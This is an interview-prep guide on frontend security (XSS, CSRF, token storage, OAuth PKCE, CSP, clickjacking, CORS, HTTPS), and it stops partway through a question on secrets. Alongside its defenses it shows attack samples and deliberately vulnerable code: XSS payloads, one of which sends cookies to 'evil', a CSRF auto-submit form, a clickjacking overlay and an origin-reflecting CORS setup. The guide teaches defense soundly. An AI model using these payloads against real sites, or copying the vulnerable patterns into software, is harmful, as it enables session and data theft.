SECTION 1 - XSS

Q1. What is XSS, and what is the difference between stored, reflected, and DOM-based XSS?

ROI: ★★★★★ Frequency: Extremely High

Short Answer

Cross-Site Scripting (XSS) is an injection attack where an attacker gets their JavaScript to run in another user's browser, in the context of your origin. Once their script runs on your origin it can do anything the user can: read the DOM, steal tokens, make authenticated requests, and impersonate the user. The three classic types differ by where the malicious payload comes from: stored (persisted on the server and served to victims), reflected (bounced back off a request parameter), and DOM-based (never touches the server — the vulnerability is entirely in client-side JS).

Detailed Answer

Stored (persistent) XSS

The payload is saved in your data store — a comment, a profile bio, a support ticket — and later rendered to every user who views it. This is the most dangerous variant because it is self-propagating and hits many victims without them clicking anything special. A classic example is the old MySpace "Samy" worm.

Reflected XSS

The payload lives in the request (typically a query string or form field) and is immediately reflected back in the response without being stored — e.g. a search page that prints You searched for: <script>...</script>. The attacker delivers it via a crafted link the victim clicks, so exploitation requires social engineering.

DOM-based XSS

The server is never involved in the injection. Untrusted data (from location.hash, document.referrer, postMessage, etc.) flows through a client-side "source" into a dangerous "sink" (innerHTML, eval, document.write) that executes it. Because the payload may sit only in the URL fragment, it can be invisible to server logs and WAFs.

TypePayload originExecutes when
StoredPersisted server-sideAny user views the tainted record
ReflectedRequest parameter, echoed onceVictim opens a crafted link
DOM-basedClient-side source (URL, postMessage)Client JS writes it into a sink

Code Example

// REFLECTED: server echoes the query param straight into HTML (vulnerable).
// GET /search?q=<script>steal()</script>
app.get("/search", (req, res) => {
  res.send(`<h1>Results for ${req.query.q}</h1>`); // NO escaping => XSS
});

// DOM-BASED: no server involvement at all.
// URL: https://app.com/#<img src=x onerror=steal()>
const frag = decodeURIComponent(location.hash.slice(1)); // SOURCE
document.getElementById("out").innerHTML = frag;         // SINK => executes

// The payload after # is never sent to the server, so server-side
// filtering cannot see or stop it.

Project Example

A B2B dashboard let users name their saved reports. Names were rendered with innerHTML in a legacy widget, and one tenant saved a report named <img src=x onerror="fetch('/api/keys').then(...)">. Every admin who opened the reports list executed that script under their own session — a stored XSS that leaked API keys. The fix was to render the name as text (never HTML) and add a CSP as defense-in-depth.

Senior Engineer Perspective

Interviewers want you to articulate the impact, not just the taxonomy: "XSS = arbitrary JS on your origin = full account takeover," because the attacker inherits the user's cookies, tokens, and CSRF ability. A strong follow-up: "Is XSS an input problem or an output problem?" The senior answer is output encoding — the same string is safe in one context (text) and lethal in another (HTML attribute, URL, JS). Filtering input alone is brittle; the durable defense is context-aware escaping at the sink plus a CSP as a second layer. Mention that OWASP now folds all three types under "Injection" (A03), reflecting that the root cause is untrusted data reaching an executable context.

Q2. How does React protect against XSS by default, and how does dangerouslySetInnerHTML reintroduce it?

ROI: ★★★★★ Frequency: Extremely High

Short Answer

React escapes any value you interpolate as a child in JSX. When you write {userInput}, React treats it as text and HTML-encodes <, >, &, and quotes, so a string like <script> is rendered as visible text, never parsed as markup. dangerouslySetInnerHTML is the deliberate escape hatch: it sets the node's innerHTML directly with no escaping, so any HTML/JS in that string is parsed and can execute. The word "dangerously" is a warning by design.

Detailed Answer

What React does and does not protect

React auto-escapes text children and, in modern React, string attribute values. It does not magically make every prop safe. Known dangerous surfaces remain:

  • dangerouslySetInnerHTML={{ __html: value }} — raw HTML injection.
  • href/src set to a javascript: URI — clicking runs script. (React 16.9+ warns, and React will not block every case.)
  • Spreading untrusted props: <div {...userControlledProps} /> can inject an onError/dangerouslySetInnerHTML.
  • Injecting untrusted CSS or style strings, or building a component type from user input.

Why the escape hatch exists

Sometimes you legitimately have trusted HTML — a CMS field, sanitized Markdown output, an email template. dangerouslySetInnerHTML exists so you can render it, but it shifts the entire responsibility for safety onto you. The rule: never pass unsanitized, user-influenced HTML to it.

Code Example

// SAFE: React escapes the text. "<script>" shows as literal characters.
function Comment({ text }) {
  return <p>{text}</p>;   // <script>alert(1)</script> renders as text
}

// DANGEROUS: raw innerHTML, no escaping => script/onerror executes.
function Bio({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />; // XSS if html is untrusted
}

// SUBTLE: javascript: URL injection via an attribute.
function Link({ url }) {
  return <a href={url}>click</a>; // url = "javascript:steal()" => runs on click
}
// Guard it:
const safeHref = /^https?:\/\//i.test(url) ? url : "#";

Project Example

A team rendered Markdown notes with dangerouslySetInnerHTML straight from the markdown-to-HTML output. Because the Markdown library allowed raw inline HTML, a user embedded <img src=x onerror=...> in a note and popped every viewer. The fix was one line conceptually: pipe the generated HTML through DOMPurify before handing it to dangerouslySetInnerHTML.

Senior Engineer Perspective

The trap interviewers set: "React is XSS-proof, right?" No — React removes the most common XSS (text interpolation) but leaves several sharp edges: dangerouslySetInnerHTML, javascript: URLs, prop spreading, and any direct DOM manipulation via refs (ref.current.innerHTML = ...) that bypasses React entirely. A senior also notes that server rendering (renderToString) and dangerous data injected into inline scripts (e.g. window.__STATE__ = ${JSON.stringify(state)}) can XSS if the state contains a </script> sequence — which is why you escape < when serializing state into HTML.

Q3. How do you safely render user-provided HTML (and why is DOMPurify the answer)?

ROI: ★★★★★ Frequency: High

Short Answer

If you must render HTML you did not fully author (rich-text comments, CMS content, Markdown), sanitize it first with a well-maintained library — the de facto standard on the client is DOMPurify. It parses the HTML, strips dangerous elements/attributes (<script>, event handlers, javascript: URLs) against an allow-list, and returns clean HTML you can pass to dangerouslySetInnerHTML. Do not hand-roll a regex "sanitizer" — HTML parsing is adversarial and you will lose.

Detailed Answer

Why an allow-list, not a block-list

Block-lists (strip <script>, strip onclick) always miss cases: SVG payloads, <math>, mutation XSS, namespace confusion, obscure event handlers. DOMPurify works on an allow-list model — only known-safe tags/attributes survive — and is continuously updated against new browser parsing quirks (mXSS). That maintenance is the whole point; a regex you wrote once will rot.

Where to sanitize

Sanitize as close to the sink as possible, and prefer doing it on both ends if you persist HTML: sanitize on write (server) to keep the store clean, and sanitize on render (client) as defense-in-depth. Configure DOMPurify to your real needs — e.g. forbid target on links or force rel="noopener".

Prefer not rendering HTML at all

The safest option is to avoid HTML: render user content as text, or use a structured format (Markdown rendered by a library that outputs safe React elements rather than an HTML string, or a JSON rich-text schema). If you never produce an HTML string from untrusted data, there is no sink to sanitize.

Code Example

import DOMPurify from "dompurify";

// Sanitize, then render. Only allow a small tag/attribute set.
function RichText({ html }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "ul", "ol", "li", "br"],
    ALLOWED_ATTR: ["href", "title"],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// Force safe link behavior via a hook (runs on every sanitize call).
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName === "A") {
    node.setAttribute("target", "_blank");
    node.setAttribute("rel", "noopener noreferrer");
  }
});

// ANTI-PATTERN — do NOT do this (regex "sanitizers" are trivially bypassed):
const bad = html.replace(/<script.*?>.*?<\/script>/gi, ""); // <img src=x onerror=..> survives

Project Example

A help-desk product let agents paste rich HTML from emails into ticket replies, which were then shown to customers. Raw rendering was an obvious stored-XSS vector. Wrapping every reply in DOMPurify.sanitize with a tight allow-list (formatting tags, links, images with https sources only) killed the vector while preserving the formatting agents needed. Sanitizing on both save and render meant even old poisoned records were neutralized on display.

Senior Engineer Perspective

Interviewers probe whether you know the limits: DOMPurify sanitizes HTML, not arbitrary contexts — it will not protect a value you drop into a javascript: URL, a CSS url(), or a JSON blob later eval'd. Context matters. A senior also mentions Trusted Types (a CSP feature) as the modern reinforcement: it makes dangerous sinks like innerHTML throw unless the string passed through a registered policy (which typically calls DOMPurify), turning "we forgot to sanitize" from a silent vulnerability into a runtime error. For SSR, note DOMPurify needs a DOM — use the jsdom-backed server build.

Q4. What is DOM-based XSS, and how do you validate/escape untrusted input on the client?

ROI: ★★★★ Frequency: High

Short Answer

DOM-based XSS happens entirely in the browser: untrusted data flows from a source (URL, location.hash, postMessage, localStorage) into a dangerous sink (innerHTML, eval, setTimeout(string), document.write, new Function) without ever going through the server. You prevent it by (1) avoiding dangerous sinks, (2) validating input against an expected shape (allow-list), and (3) escaping/encoding for the exact context you output into — text, attribute, URL, or JS.

Detailed Answer

Sources and sinks

Learn the common ones so you can audit code quickly:

  • Sources (attacker-controllable): location (href/search/hash), document.referrer, window.name, postMessage data, values read back from storage/cookies.
  • Sinks (execute strings): element.innerHTML/outerHTML, document.write, eval, Function, setTimeout/setInterval with a string, a.href = "javascript:...", jQuery's $(html).

Validation vs. escaping

They are different jobs. Validation rejects input that doesn't match an expected format (a numeric ID must be digits; a redirect target must be a known-good path). Escaping/encoding makes data safe for a specific output context so it is treated as data, not code. You often need both. Critically, escaping is context-specific: HTML-encoding is right for text, but a value going into a URL needs URL-encoding, and a value going into a JS string needs JS-string escaping.

postMessage is a common blind spot

A message listener that trusts event.data and writes it to the DOM is a classic DOM-XSS. Always check event.origin against an allow-list before using the data.

Code Example

// SAFE sink: textContent treats input as text, never markup.
el.textContent = untrusted;          // OK
// el.innerHTML = untrusted;         // DOM-XSS

// Validate a redirect target against an allow-list of internal paths.
function safeRedirect(next) {
  // reject absolute URLs and protocol-relative "//evil.com"
  if (typeof next !== "string" || !next.startsWith("/") || next.startsWith("//")) {
    return "/";
  }
  return next;
}

// Harden a postMessage listener: check origin before trusting data.
window.addEventListener("message", (event) => {
  if (event.origin !== "https://trusted.example.com") return; // reject others
  handle(event.data); // still validate shape before using
});

Project Example

An embedded payment widget communicated with the host page via postMessage. The host listener rendered event.data.message into a status banner with innerHTML and never checked event.origin. Any page that iframed the widget could post a crafted message and inject script into the host. The fix: verify event.origin against the known widget origin and switch the banner to textContent.

Senior Engineer Perspective

The senior signal is speaking in source-to-sink terms and knowing that DOM-XSS is invisible to server-side defenses — WAFs and server input filters never see a payload that lives in the URL fragment. Emphasize that in React you rarely touch raw sinks, but you reintroduce them via dangerouslySetInnerHTML, direct ref DOM writes, or third-party widgets. A great closing point: encoding must match the sink's context, and the cleanest architecture avoids sinks entirely by keeping untrusted data as data (text nodes, typed props) rather than ever serializing it into an executable string.

SECTION 2 - AUTH & TOKENS

Q5. Where should you store JWTs/access tokens — localStorage vs an httpOnly cookie?

ROI: ★★★★★ Frequency: Extremely High

Short Answer

It is a trade-off between XSS exposure and CSRF exposure, and there is no free lunch. localStorage is readable by any JS on your origin, so a single XSS steals the token — but it is immune to CSRF because the browser never attaches it automatically. An httpOnly cookie is invisible to JS (so XSS cannot read it) but is sent automatically with requests, which opens CSRF unless you add SameSite/CSRF-token defenses. The generally recommended pattern for SPAs is a short-lived access token kept in memory plus a refresh token in an httpOnly, Secure, SameSite cookie.

Detailed Answer

The two threat models

StorageReadable by JS?Auto-sent?Main risk
localStorage / sessionStorageYesNo (you attach it)XSS steals it outright
Non-httpOnly cookieYesYesXSS and CSRF
httpOnly cookieNoYesCSRF (mitigate with SameSite)
In-memory (JS variable)Yes (this tab only)NoLost on refresh; still XSS-readable while live

Why "in memory + httpOnly refresh cookie" is favored

The access token lives in a JS variable (or React state/context), so it is never persisted to disk and vanishes on tab close. It is short-lived (minutes), so even if stolen the window is small. The long-lived refresh token sits in an httpOnly, Secure, SameSite=Strict/Lax cookie scoped to the auth endpoint, so JS can't read it and CSRF is constrained. On load or 401, the app silently calls /refresh to mint a new access token.

The honest caveat

If you have XSS, you are in trouble regardless: even with an httpOnly cookie, injected script can just make authenticated requests from the victim's browser (the cookie rides along) — it just can't exfiltrate the token itself. So token storage is about reducing blast radius, not a substitute for preventing XSS.

Code Example

// Access token in memory (module scope), refresh via httpOnly cookie.
let accessToken = null; // never in localStorage

async function refresh() {
  // browser sends the httpOnly refresh cookie automatically
  const res = await fetch("/auth/refresh", { method: "POST", credentials: "include" });
  const { token } = await res.json();
  accessToken = token;
  return token;
}

async function api(path, opts = {}) {
  let res = await fetch(path, {
    ...opts,
    headers: { ...opts.headers, Authorization: `Bearer ${accessToken}` },
  });
  if (res.status === 401) {         // access token expired
    await refresh();                // silent refresh
    res = await fetch(path, {
      ...opts,
      headers: { ...opts.headers, Authorization: `Bearer ${accessToken}` },
    });
  }
  return res;
}

// Server sets the refresh cookie like:
// Set-Cookie: refresh=...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh

Project Example

A fintech SPA originally stored a long-lived JWT in localStorage. A pen-test found one reflected-XSS on an error page; the tester exfiltrated the JWT and demonstrated full account access with no expiry. We moved to a 10-minute in-memory access token plus an httpOnly refresh cookie. The same XSS could still act as the user briefly, but it could no longer steal a durable credential to use offline — and rotating refresh tokens let us revoke sessions server-side.

Senior Engineer Perspective

The mistake juniors make is treating this as a settled "localStorage is always wrong" rule. The senior answer frames it as XSS-exposure vs CSRF-exposure and states the mitigations for each path. Key nuances to raise: (1) an httpOnly cookie doesn't stop XSS from acting as the user, so preventing XSS (CSP, sanitization) is still the primary control; (2) refresh tokens should rotate and be revocable server-side; (3) access tokens should be short-lived so theft has a small window; (4) for cross-site cookie setups you need SameSite=None; Secure plus a CSRF token, which reintroduces complexity. There is no universally correct answer — the interviewer wants to hear you reason about the specific deployment.

Q6. What is CSRF, why are cookie-based SPAs vulnerable, and how do tokens and SameSite cookies defend against it?

ROI: ★★★★★ Frequency: High

Short Answer

Cross-Site Request Forgery (CSRF) tricks a logged-in user's browser into sending an unwanted authenticated request to your site from a different site. It works because browsers automatically attach cookies to requests to your origin regardless of who initiated them. If your session is a cookie and the server trusts "cookie present = authorized," a malicious page can silently trigger state-changing actions (transfer money, change email) as the victim. Defenses: a CSRF token the attacker can't know, and SameSite cookies that stop the browser from sending the cookie on cross-site requests.

Detailed Answer

Why cookies are the root cause

CSRF exploits ambient authority: the cookie is sent by the browser automatically, so the request looks authentic to the server even though the user never intended it. Note this is exactly why token-in-header schemes (Authorization: Bearer read from JS) are not vulnerable to classic CSRF — the attacker's page can't read your token to set the header, and the browser won't attach it for them.

Defense 1 — SameSite cookies

  • SameSite=Strict: cookie is never sent on any cross-site request (even top-level navigation). Strongest, but can log users out when arriving via external links.
  • SameSite=Lax (modern browser default): sent on top-level GET navigations but not on cross-site POST/subresource requests — blocks the classic form-POST CSRF while keeping normal link-following usable.
  • SameSite=None; Secure: sent cross-site (needed for third-party contexts); requires HTTPS and reopens CSRF, so pair with a token.

Defense 2 — CSRF tokens

The server issues an unpredictable token tied to the session; the SPA must echo it back in a header or body on state-changing requests. The attacker's cross-site page cannot read it (Same-Origin Policy), so it cannot forge the request. Two common patterns: the synchronizer token (server stores/validates it) and the double-submit cookie (token sent both as a cookie and a header; server checks they match).

Code Example

// Attacker page (evil.com) — no JS token access needed; the cookie auto-attaches.
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>  // fires as the logged-in victim

// Defense: server sets a SameSite cookie AND requires a CSRF header.
// Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
// Set-Cookie: csrf=RANDOM; Secure; SameSite=Lax   (readable, double-submit)

// SPA echoes the csrf cookie value in a header the attacker cannot set cross-site.
function csrfFetch(url, opts = {}) {
  const token = getCookie("csrf");
  return fetch(url, {
    ...opts,
    credentials: "include",
    headers: { ...opts.headers, "X-CSRF-Token": token },
  });
}

Project Example

An admin portal used a plain session cookie with no SameSite attribute and no CSRF token. A crafted email with an auto-submitting form let an attacker create admin users when a signed-in admin merely opened it. Two changes closed it: setting SameSite=Lax on the session cookie (killing the cross-site POST outright) and adding a double-submit CSRF token validated on every mutating endpoint as defense-in-depth for browsers/edge cases where SameSite couldn't be relied on.

Senior Engineer Perspective

The distinction interviewers love: XSS defeats CSRF defenses. If an attacker has XSS on your origin, they run in your context, can read CSRF tokens, and same-origin requests sail through — so CSRF protection assumes you're already XSS-free. Also be precise that SameSite is a strong default layer but not a complete solution: it doesn't protect non-browser clients, can be bypassed via same-site subdomains, and Lax still allows cross-site top-level GETs (so never perform state changes on GET). The mature stance: SameSite + a token, and never rely on a single control.

Q7. How does OAuth2 / OIDC with PKCE work for a SPA, and why is the implicit flow dead?

ROI: ★★★★ Frequency: Medium

Short Answer

A SPA is a public client — it can't keep a client secret, because anything shipped to the browser is readable. The current best practice is the Authorization Code flow with PKCE (Proof Key for Code Exchange). The app generates a random code_verifier, sends its hash (code_challenge) when redirecting to the authorization server, receives a one-time authorization code on redirect back, then exchanges that code for tokens while proving it knows the original verifier. The old implicit flow (tokens returned directly in the URL fragment) is deprecated because tokens leaked into browser history, logs, and referrers, and had no protection against interception. OIDC adds an ID token (who the user is) on top of OAuth2 (delegated authorization).

Detailed Answer

Why PKCE

Without a client secret, an intercepted authorization code could be redeemed by an attacker. PKCE binds the code to the client that started the flow: only the party holding the original code_verifier (which never left the browser) can exchange the code, so a stolen code is useless. Originally designed for mobile apps, PKCE is now recommended for all OAuth clients, SPAs included.

OAuth2 vs OIDC

  • OAuth2 = authorization: "this app may access these resources on the user's behalf" (access token, scopes).
  • OIDC = authentication layer on top: an ID token (a JWT) that proves the user's identity, plus a standard /userinfo endpoint. Use OIDC when you want "log in with X," not just API access.

The flow, step by step

  1. SPA creates code_verifier (random) and code_challenge = SHA256(verifier), plus a state value for CSRF protection.
  2. Redirect to the auth server's /authorize with response_type=code, code_challenge, state, scopes.
  3. User authenticates; auth server redirects back with a one-time code and echoes state (verify it matches).
  4. SPA POSTs the code + original code_verifier to /token; receives access token (+ ID token, + refresh token).

Code Example

// PKCE setup (conceptual — use a vetted library like oidc-client-ts in real apps).
function base64url(buf) {
  return btoa(String.fromCharCode(...new Uint8Array(buf)))
    .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

async function startLogin() {
  const verifier = base64url(crypto.getRandomValues(new Uint8Array(32)));
  const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(verifier));
  const challenge = base64url(digest);
  const state = base64url(crypto.getRandomValues(new Uint8Array(16)));

  sessionStorage.setItem("pkce_verifier", verifier); // needed for the token exchange
  sessionStorage.setItem("oauth_state", state);

  const params = new URLSearchParams({
    response_type: "code",
    client_id: CLIENT_ID,
    redirect_uri: REDIRECT_URI,
    scope: "openid profile email",
    code_challenge: challenge,
    code_challenge_method: "S256",
    state,
  });
  location.assign(`${AUTH_SERVER}/authorize?${params}`);
}

Project Example

A dashboard migrated from a legacy implicit-flow integration (access token landing in window.location.hash) to Authorization Code + PKCE via oidc-client-ts. Beyond fixing the token-in-URL leak, the switch let us obtain refresh tokens with rotation and keep the access token in memory, and the state parameter closed the authorization-code CSRF hole. We deliberately used a maintained library rather than hand-rolling the crypto and redirect handling.

Senior Engineer Perspective

Key senior points: (1) a SPA is a public client, so never embed a client secret; PKCE replaces it. (2) The state parameter is mandatory to prevent CSRF on the redirect, and (3) nonce (OIDC) binds the ID token to the request to prevent replay. (4) Don't hand-roll OAuth — subtle mistakes are catastrophic; use a certified library. A forward-looking note: many teams are moving auth to the server (BFF — Backend-for-Frontend pattern) so tokens never touch the browser at all, sidestepping browser token-storage risk entirely; mentioning the BFF pattern signals current awareness.

SECTION 3 - REQUESTS & HEADERS

Q8. What is a Content Security Policy (CSP) and how does it mitigate XSS?

ROI: ★★★★★ Frequency: High

Short Answer

A Content Security Policy is an HTTP response header (Content-Security-Policy) that tells the browser which sources of content are allowed to load and execute — scripts, styles, images, connections, frames. Its headline benefit is XSS mitigation: a well-configured CSP blocks inline scripts and scripts from unapproved origins, so even if an attacker injects <script>, the browser refuses to run it. CSP is defense-in-depth — a safety net for when output encoding fails, not a replacement for it.

Detailed Answer

How it stops injected script

The most impactful directive is script-src. If your policy doesn't include 'unsafe-inline', the browser will not execute inline <script>alert(1)</script> or onerror= handlers — which is exactly what most XSS payloads rely on. Scripts are only run if they come from an allow-listed origin, or carry a matching nonce or hash.

Nonces and hashes (the modern approach)

Because allow-listing origins is leaky (a trusted CDN can host attacker files) and 'unsafe-inline' defeats the purpose, the recommended strategy is a nonce-based, strict CSP: the server generates a fresh random nonce per response, adds it to the CSP (script-src 'nonce-abc123') and to each legitimate <script nonce="abc123">. Injected scripts lack the nonce and are blocked. 'strict-dynamic' lets nonced scripts load further scripts they trust.

Report-only rollout

Deploy with Content-Security-Policy-Report-Only first: the browser reports violations to a report-uri/report-to endpoint without blocking, so you can find what would break before enforcing.

Code Example

// A reasonably strict, nonce-based policy (sent as a response header):
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m' 'strict-dynamic';
  style-src 'self';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self'

// Server adds the same nonce to each trusted script tag:
<script nonce="r4nd0m" src="/app.js"></script>

// Injected by an attacker via XSS — has no nonce, so the browser blocks it:
<script>fetch("//evil/?c="+document.cookie)</script>   // NOT executed

Project Example

After a near-miss stored-XSS, a team added a report-only CSP for two weeks, fixed the inline scripts and third-party origins it flagged, then enforced a nonce-based policy. Months later a new vulnerable dependency introduced an XSS sink — but the CSP blocked the injected exfiltration script and fired a violation report, turning what would have been a breach into an alert. That is exactly the defense-in-depth value proposition.

Senior Engineer Perspective

Interviewers check whether you know CSP's limits and pitfalls: (1) 'unsafe-inline' and 'unsafe-eval' largely neuter the XSS protection — avoid them; frameworks that need eval or inline styles push people toward weak policies. (2) Origin allow-lists are commonly bypassable (JSONP endpoints, open CDNs), which is why Google's research pushes nonce + strict-dynamic over host allow-lists. (3) CSP also does more than script control — frame-ancestors replaces X-Frame-Options, connect-src limits exfiltration channels, and Trusted Types (require-trusted-types-for 'script') locks down DOM sinks. Framing CSP as a layered safety net, not a primary fix, is the mature position.

Q9. What is clickjacking, and how do X-Frame-Options and frame-ancestors stop it?

ROI: ★★★★ Frequency: Medium

Short Answer

Clickjacking (UI redressing) is an attack where a malicious site loads your page in a transparent or disguised iframe and tricks the user into clicking something they can't see — the invisible "Delete account" or "Confirm payment" button of your app, overlaid under an innocent-looking decoy. You defend against it by telling the browser who is allowed to frame your pages: the legacy header X-Frame-Options (DENY or SAMEORIGIN) and the modern, more flexible CSP directive frame-ancestors.

Detailed Answer

How the attack works

The attacker's page sets your site in an <iframe> with opacity: 0 (or clipped/positioned) and places bait UI beneath the mouse so that a click the user thinks lands on "Play video" actually lands on your framed "Transfer funds" button. Because the click happens inside your authenticated frame, the action executes as the logged-in user.

The two controls

  • X-Frame-Options: DENY — the page may never be framed. SAMEORIGIN — only your own origin may frame it. Widely supported but coarse (only one origin, no allow-list).
  • Content-Security-Policy: frame-ancestors 'none' (or a list of allowed origins) — the modern replacement, supports multiple origins and is part of CSP. When both are present, frame-ancestors takes precedence in modern browsers.

Which to use

Send both for maximum coverage: frame-ancestors for modern browsers, X-Frame-Options for older ones. Use DENY/'none' unless you have a legitimate need to be embedded (then allow-list the specific parent origins).

Code Example

// Attacker's page overlays your app invisibly on top of bait.
<style>
  iframe { position: absolute; top: 0; opacity: 0; width: 800px; height: 600px; }
  .bait  { position: absolute; top: 180px; left: 120px; } /* under the hidden button */
</style>
<button class="bait">Claim your free prize!</button>
<iframe src="https://yourbank.com/transfer"></iframe>  // click lands here

// Defense — send BOTH headers from your server:
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'

// If you must allow specific embedders:
Content-Security-Policy: frame-ancestors 'self' https://partner.example.com

Project Example

A SaaS app's account-settings page had no framing protection. A security researcher demonstrated a clickjacking PoC that could toggle "make workspace public" with a single disguised click. Adding X-Frame-Options: SAMEORIGIN plus frame-ancestors 'self' at the CDN/edge for all HTML responses closed it globally in one config change, while still permitting the app's own in-product preview iframes.

Senior Engineer Perspective

Strong candidates note that X-Frame-Options is effectively superseded by frame-ancestors (which supports multiple origins and finer control), but you still send both for legacy coverage. A good follow-up: "Is a JavaScript frame-buster (if (top !== self) top.location = self.location) enough?" No — frame-busting scripts have been repeatedly bypassed (sandboxed iframes, onbeforeunload tricks) and shouldn't be relied on. The header-based defense is the correct control. Also mention that these headers should be applied at the edge/proxy to guarantee coverage across every HTML route, not per-component.

ROI: ★★★★ Frequency: Medium

Short Answer

Beyond CSP and framing controls, a hardened frontend sends a small set of response headers: HSTS (force HTTPS), X-Content-Type-Options: nosniff (stop MIME sniffing), Referrer-Policy (limit URL leakage), Permissions-Policy (disable unused browser features like camera/geolocation), and the framing/CSP headers already covered. These are cheap, set once at the edge/server, and collectively raise the cost of many attacks.

Detailed Answer

Q11. Is CORS a security mechanism — and why is it not a substitute for authorization?

ROI: ★★★★ Frequency: High

Short Answer

CORS (Cross-Origin Resource Sharing) is a controlled relaxation of the browser's Same-Origin Policy, not a server-side access control. It governs whether a browser will let JavaScript on origin A read a response from origin B. It protects users from one site's script silently reading another site's data — it does not protect your API from being called. Non-browser clients (curl, Postman, servers) ignore CORS entirely. So authentication and authorization must live in your backend; CORS is never a substitute.

Detailed Answer

What CORS actually controls

By default the Same-Origin Policy lets the browser send a cross-origin request but blocks JS from reading the response. CORS lets the server opt in by returning headers like Access-Control-Allow-Origin. For "non-simple" requests the browser first sends a preflight OPTIONS request; the server's response headers decide whether the real request/read is permitted.

The common misconception

People think "CORS blocks other sites from hitting my API." It does not. The request often still reaches and executes on your server; CORS only stops the attacker's browser-side JS from reading the response. And any non-browser tool bypasses it completely. Therefore an endpoint with lax auth is vulnerable regardless of CORS config.

Dangerous CORS misconfigurations

  • Reflecting the request Origin back into Access-Control-Allow-Origin and setting Access-Control-Allow-Credentials: true — this lets any site make credentialed requests and read the response. Effectively "allow all origins with cookies."
  • Using Access-Control-Allow-Origin: * together with credentials (browsers forbid this combo, but people try to work around it insecurely).
  • Over-broad allow-lists that include untrusted subdomains.

Code Example

// DANGEROUS: reflecting Origin + allowing credentials = any site reads your data.
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", req.headers.origin); // reflects ANY origin
  res.header("Access-Control-Allow-Credentials", "true");        // + cookies => bad
  next();
});

// SAFER: explicit allow-list, and remember CORS != authz.
const ALLOWED = new Set(["https://app.example.com"]);
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED.has(origin)) {
    res.header("Access-Control-Allow-Origin", origin);
    res.header("Access-Control-Allow-Credentials", "true");
    res.header("Vary", "Origin"); // caches must key on Origin
  }
  next();
});
// The endpoint STILL must verify the session/token itself.

Project Example

A developer "fixed" CORS errors by reflecting the incoming Origin and enabling credentials — copy-pasted from a blog. A pen-test showed any malicious website could now make authenticated calls (cookies attached) and read private user data cross-origin. The correct fix was a strict origin allow-list plus Vary: Origin, and, importantly, confirming every endpoint independently validated the session so that CORS was never the thing standing between an attacker and the data.

Senior Engineer Perspective

The line interviewers want: "CORS protects the user's browser, not my server." A relaxed CORS policy is an attack enabler (it lets malicious sites read responses), never an authorization control. Nuances that impress: preflight caching via Access-Control-Max-Age; the credentialed-request rules (can't use * with credentials, must reflect an exact origin and set Vary: Origin); and that CORS is unrelated to CSRF — SameSite cookies, not CORS, address CSRF. If someone says "just set Allow-Origin: * to make it work," that's a red flag you should catch.

Q12. Why does HTTPS matter for a SPA, and what is mixed content?

ROI: ★★★ Frequency: Medium

Short Answer

HTTPS gives you confidentiality, integrity, and authentication of the connection: no one on the network can read or tamper with your traffic, and the user knows they're talking to the real server. Without it, an attacker on the same network can inject script into your page or steal tokens in transit. Mixed content is when an HTTPS page loads sub-resources (scripts, images, XHR) over plain HTTP — it reopens exactly the risks HTTPS closed, so browsers block active mixed content (scripts, iframes, fetch) and warn on passive content (images).

Detailed Answer

Why plain HTTP breaks a SPA's security model

Every guarantee above (CSP, token secrecy, integrity of your JS bundle) assumes the bytes arrive untampered. Over HTTP, a man-in-the-middle can rewrite your JavaScript on the wire and inject a keylogger — no XSS needed. That's why tokens must only travel over HTTPS and cookies must be marked Secure.

Mixed content categories

  • Active mixed content (script, stylesheet, iframe, fetch/XHR, WebSocket): can alter the whole page, so browsers block it outright.
  • Passive/display mixed content (img, audio, video): lower risk, so browsers warn or auto-upgrade rather than block.

Fixes

Serve all resources over HTTPS. Use protocol-relative or absolute https:// URLs, and let the CSP directive upgrade-insecure-requests auto-upgrade legacy HTTP references. Pair HTTPS with HSTS so the browser refuses to even attempt HTTP.

Code Example

// Mixed content on an https:// page — browser BLOCKS this script:
<script src="http://cdn.example.com/analytics.js"></script>  // insecure => blocked

// Fix: use https, and let CSP upgrade any stragglers.
<script src="https://cdn.example.com/analytics.js"></script>

// Response headers:
Content-Security-Policy: upgrade-insecure-requests
Strict-Transport-Security: max-age=63072000; includeSubDomains

// Mark auth cookies Secure so they never travel over HTTP:
Set-Cookie: session=...; Secure; HttpOnly; SameSite=Lax

Project Example

After migrating a marketing SPA to HTTPS, several charts silently stopped rendering — the console showed blocked mixed-content requests to an old http:// image/data host. Adding upgrade-insecure-requests to the CSP and correcting the hardcoded HTTP URLs fixed it, and enabling HSTS ensured the browser never downgraded, closing an SSL-strip window on hotel/airport Wi-Fi.

Senior Engineer Perspective

Senior points: HTTPS is the precondition for the rest of your frontend security (Secure cookies, token secrecy, Subresource Integrity, service workers — which require a secure context). Mention Subresource Integrity (SRI) as a complementary control: an integrity hash on a CDN <script> means the browser refuses to run it if the file was tampered with, defending against a compromised CDN even over HTTPS. And note that HSTS with preload hardcodes HTTPS-only into the browser before the first request, closing the trust-on-first-use gap.

SECTION 4 - DEPENDENCIES & BEST PRACTICES

Q13. How do you avoid leaking secrets in a frontend bundle or environment variables?

ROI: ★★★★★ Frequency: High

Short Answer

Assume everything shipped to the browser is public — anyone can open DevTools or the source map and read it. So no real secret (API keys with privileges, DB credentials, private tokens, signing keys) may ever be embedded in frontend code or build-time env vars. Build tools like Vite/CRA inline env vars prefixed for the client (VITE_, REACT_APP_) directly into the bundle as plaintext. Any operation that needs a secret must happen on a backend/proxy; the frontend calls your server, and your server holds the secret.

Detailed Answer

The core misconception

